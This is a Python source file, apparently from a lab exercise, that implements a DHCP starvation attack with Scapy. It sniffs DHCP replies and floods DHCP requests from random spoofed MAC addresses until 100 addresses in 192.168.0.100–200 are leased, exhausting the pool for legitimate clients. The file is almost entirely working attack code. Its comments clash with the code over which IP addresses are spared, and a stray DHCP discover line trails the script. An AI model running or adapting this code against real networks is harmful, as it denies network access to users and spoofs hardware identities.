from scapy.all import *
from time import sleep
from threading import Thread

from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether


class DHCPStarvation(object):

    def __init__(self):
        # Generated MAC stored to avoid same MAC requesting for different IP
        self.mac = [""]
        # Requested IP stored to identify registered IP
        self.ip = []

    def handle_dhcp(self, pkt):
        if pkt[DHCP]:
            # if DHCP server reply ACK, the IP address requested is registered
            # 10.10.111.107 is IP for bt5, not to be starved
            if pkt[DHCP].options[0][1] == 5 and pkt[IP].dst != "192.168.0.104":
                self.ip.append(pkt[IP].dst)
                print(str(pkt[IP].dst) + " registered")
            # Duplicate ACK may happen due to packet loss
            elif pkt[DHCP].options[0][1] == 6:
                print("NAK received")

    def listen(self):
        # sniff DHCP packets
        sniff(filter="udp and (port 67 or port 68)",
              prn=self.handle_dhcp,
              store=0)

    def start(self):
        # start packet listening thread
        thread = Thread(target=self.listen)
        thread.start()
        print("Starting DHCP starvation...")
        # Keep starving until all 100 targets are registered
        # 100~200 excepts 107 = 100
        while len(self.ip) < 100: self.starve()
        print("Targeted IP address starved")

    def starve(self):
        for i in range(101):
            # don't request 10.10.111.107
            if i == 7: continue
            # generate IP we want to request
            # if IP already registered, then skip
            requested_addr = "192.168.0." + str(100 + i)
            if requested_addr in self.ip:
                continue

            # generate MAC, avoid duplication
            src_mac = ""
            while src_mac in self.mac:
                src_mac = RandMAC()
            self.mac.append(src_mac)
            # generate DHCP request packet
            pkt = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
            pkt /= UDP(sport=68, dport=67)
            # pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))
            pkt /= DHCP(options=[("message-type", "request"),
                                 ("requested_addr", requested_addr),
                                 ("server_id", "10.10.111.1"),
                                 "end"])
            sendp(pkt)
            # print("Trying to occupy "+str(requested_addr))
            sleep(0.2)  # interval to avoid congestion and packet loss


if __name__ == "__main__":
    starvation = DHCPStarvation()
    starvation.start()

dhcp_discover = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68,dport=67) / BOOTP(chaddr=RandString(12, '0123456789abcdef')) / DHCP(options=[("message-type", "discover"), "end"])
